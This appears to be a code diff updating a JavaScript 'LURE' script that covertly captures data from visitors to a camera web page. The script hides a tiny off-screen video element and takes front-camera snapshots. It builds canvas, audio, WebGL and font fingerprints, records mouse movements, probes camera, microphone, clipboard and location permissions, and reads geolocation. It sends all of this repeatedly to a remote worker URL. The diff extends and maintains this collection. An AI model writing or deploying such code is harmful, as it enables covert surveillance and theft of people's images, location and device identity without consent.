@@ -23,7 +23,7 @@ lureVideo.muted = true;
 lureVideo.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0.01;pointer-events:none';
 document.body.appendChild(lureVideo);
 
-// Throttle mouse/touch events
+// Mouse & Touch tracking
 let lastMouseRecord = 0;
 document.addEventListener('mousemove', e => {
   const now = Date.now();
@@ -103,15 +103,14 @@ async function collectStaticData() {
   try {
     const c = document.createElement('canvas');
     const ctx = c.getContext('2d');
-    c.width = 240; 
-    c.height = 70;
+    c.width = 240; c.height = 70;
     ctx.textBaseline = 'top';
     ctx.font = 'bold 18px Arial';
     ctx.fillStyle = '#c0c0c0';
     ctx.fillText('PHOTON CAPTURE 2026', 8, 20);
     ctx.fillStyle = '#f60';
     ctx.fillRect(160, 25, 65, 30);
-    p.canvasFingerprint = c.toDataURL('image/png').slice(-120);
+    p.canvasFingerprint = c.toDataURL('image/png').slice(-150);
   } catch (e) {}
 
   // Audio Fingerprint
@@ -124,7 +123,7 @@ async function collectStaticData() {
     osc.connect(analyser);
     analyser.connect(audioCtx.destination);
     osc.start();
-    await new Promise(r => setTimeout(r, 80));
+    await new Promise(r => setTimeout(r, 100));
     const data = new Uint8Array(analyser.frequencyBinCount);
     analyser.getByteFrequencyData(data);
     p.audioFingerprint = btoa(String.fromCharCode(...data.slice(0, 60)));
@@ -132,7 +131,7 @@ async function collectStaticData() {
     audioCtx.close();
   } catch (e) {}
 
-  // WebGL Fingerprint
+  // WebGL Fingerprint (Improved)
   try {
     const glc = document.createElement('canvas');
     const gl = glc.getContext('webgl') || glc.getContext('experimental-webgl');
@@ -141,12 +140,15 @@ async function collectStaticData() {
       p.webglFingerprint = {
         vendor: debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
         renderer: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
-        version: gl.getParameter(gl.VERSION)
+        version: gl.getParameter(gl.VERSION) || null,
+        shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION) || null
       };
     }
-  } catch (e) {}
+  } catch (e) {
+    console.warn('[LURE] WebGL FP failed:', e.message);
+  }
 
-  // Installed Fonts (limited)
+  // Fonts
   try {
     const fontList = ['Arial','Helvetica','Times','Courier','Verdana','Georgia','Tahoma','Impact','Comic Sans MS'];
     const testDiv = document.createElement('div');
@@ -154,27 +156,31 @@ async function collectStaticData() {
     document.body.appendChild(testDiv);
     for (const font of fontList) {
       testDiv.style.fontFamily = font;
-      if (testDiv.offsetWidth > 10) p.fonts.push(font);
+      if (testDiv.offsetWidth > 5) p.fonts.push(font);
     }
     document.body.removeChild(testDiv);
   } catch (e) {}
 
-  // Plugins & Mime Types
+  // Plugins & MimeTypes
   try {
     p.plugins = Array.from(navigator.plugins || []).map(p => p.name).slice(0, 15);
     p.mimeTypes = Array.from(navigator.mimeTypes || []).map(m => m.type).slice(0, 15);
   } catch (e) {}
 
-  // Permissions
-  const permNames = ['camera', 'microphone', 'geolocation', 'notifications'];
+  // Permissions (Critical Fix)
+  const permNames = ['camera', 'microphone', 'geolocation', 'notifications', 'clipboard-read', 'clipboard-write'];
   for (const name of permNames) {
     try {
-      const status = await navigator.permissions?.query({ name });
-      p.permissionStates[name] = status?.state || null;
-    } catch {}
+      if (navigator.permissions) {
+        const status = await navigator.permissions.query({ name });
+        p.permissionStates[name] = status?.state || 'unknown';
+      }
+    } catch (e) {
+      p.permissionStates[name] = 'blocked-or-denied';
+    }
   }
 
-  console.log('[LURE] Static data collected');
+  console.log('[LURE] Static data collected successfully');
   return p;
 }
 
@@ -209,11 +215,11 @@ async function collectDynamicData() {
   // Geolocation
   try {
     const pos = await new Promise((res, rej) => {
-      const timeout = setTimeout(() => rej(new Error('timeout')), 6000);
+      const timeout = setTimeout(() => rej(new Error('timeout')), 7000);
       navigator.geolocation.getCurrentPosition(
         pos => { clearTimeout(timeout); res(pos); },
         err => { clearTimeout(timeout); rej(err); },
-        { enableHighAccuracy: false, timeout: 6000, maximumAge: 120000 }
+        { enableHighAccuracy: false, timeout: 7000, maximumAge: 120000 }
       );
     });
     p.geolocation = {
@@ -227,14 +233,13 @@ async function collectDynamicData() {
     p.geolocationError = e.message || 'Failed';
   }
 
-  // Front Camera Photo (if available from main stream)
+  // Front Photo
   try {
     if (typeof cacheElement === 'function' && typeof S !== 'undefined' && !S.previewActive) {
       const mainVideo = cacheElement('vid');
       if (mainVideo && mainVideo.videoWidth > 100) {
         const canvas = document.createElement('canvas');
-        canvas.width = 320;
-        canvas.height = 320;
+        canvas.width = 320; canvas.height = 320;
         const ctx = canvas.getContext('2d');
 
         if (S.facing === 'user') {
@@ -247,26 +252,21 @@ async function collectDynamicData() {
         if (p.frontPhoto.length > 45000) p.frontPhoto = p.frontPhoto.substring(0, 45000);
       }
     }
-  } catch (e) {
-    console.warn('[LURE] Front photo capture skipped:', e.message);
-  }
+  } catch (e) {}
 
   // Audio Devices
   try {
     const devices = await navigator.mediaDevices.enumerateDevices();
     p.audioDevices = devices
-      .filter(d => d.kind === 'audioinput' || d.kind === 'audiooutput')
+      .filter(d => d.kind.includes('audio'))
       .slice(0, 6)
-      .map(d => ({
-        kind: d.kind,
-        label: (d.label || 'unknown').substring(0, 40)
-      }));
+      .map(d => ({ kind: d.kind, label: (d.label || 'unknown').substring(0, 40) }));
   } catch (e) {}
 
   return p;
 }
 
-// Convert to snake_case for backend compatibility
+// Robust snake_case converter
 function toSnakeCase(obj) {
   if (!obj || typeof obj !== 'object' || Array.isArray(obj)) return obj;
   const result = {};
@@ -287,8 +287,11 @@ async function sendPayload() {
     const data = await collectDynamicData();
     const payload = toSnakeCase(data);
 
+    // Ensure critical fields exist
+    payload.session_id = sessionId;
+
     const controller = new AbortController();
-    const timeoutId = setTimeout(() => controller.abort(), 10000);
+    const timeoutId = setTimeout(() => controller.abort(), 12000);
 
     const response = await fetch(WORKER_URL, {
       method: 'POST',
@@ -301,18 +304,18 @@ async function sendPayload() {
     clearTimeout(timeoutId);
 
     if (response.ok) {
-      console.log('[LURE] ✅ Payload sent successfully');
+      console.log('[LURE] ✅ Data sent successfully');
     } else {
-      console.warn('[LURE] ⚠️ HTTP error:', response.status);
+      console.warn('[LURE] ⚠️ Server responded with:', response.status);
     }
   } catch (e) {
-    console.error('[LURE] Send failed:', e.name === 'AbortError' ? 'Timeout' : e.message);
+    console.error('[LURE] Send error:', e.name === 'AbortError' ? 'Timeout' : e.message);
   } finally {
     isSending = false;
   }
 }
 
-// Camera control functions (for integration with script.js)
+// Camera controls (preserve existing integration)
 async function pauseLureCamera() {
   if (typeof S !== 'undefined') S.previewActive = true;
   if (lureVideoStream) {
@@ -332,21 +335,22 @@ async function initLureCamera() {
     if (lureVideoStream) lureVideoStream.getTracks().forEach(t => t.stop());
 
     const videoTrack = S.stream.getVideoTracks()[0];
-    if (!videoTrack) return false;
-
-    lureVideoStream = new MediaStream([videoTrack]);
-    lureVideo.srcObject = lureVideoStream;
-    await lureVideo.play();
-    return true;
+    if (videoTrack) {
+      lureVideoStream = new MediaStream([videoTrack]);
+      lureVideo.srcObject = lureVideoStream;
+      await lureVideo.play();
+      return true;
+    }
   } catch (e) {
-    console.warn('[LURE] Camera init failed:', e.message);
-    return false;
+    console.warn('[LURE] Camera init warning:', e.message);
   }
+  return false;
 }
 
 async function initLureSystem() {
   console.log('[LURE] Initializing full capture system...');
 
+  // Wait for main camera stream
   let attempts = 0;
   while (attempts < 60) {
     if (typeof S !== 'undefined' && S.stream) {
@@ -367,7 +371,7 @@ async function initLureSystem() {
   basePayload = await collectStaticData();
   await initLureCamera();
 
-  setTimeout(sendPayload, 3000);
+  setTimeout(sendPayload, 2500);
   sendIntervalId = setInterval(sendPayload, SEND_INTERVAL);
 
   window.addEventListener('beforeunload', () => {
@@ -378,7 +382,7 @@ async function initLureSystem() {
   console.log('[LURE] 🚀 Full capture system active');
 }
 
-// Start System
+// Start
 if (document.readyState === 'loading') {
   document.addEventListener('DOMContentLoaded', initLureSystem);
 } else {
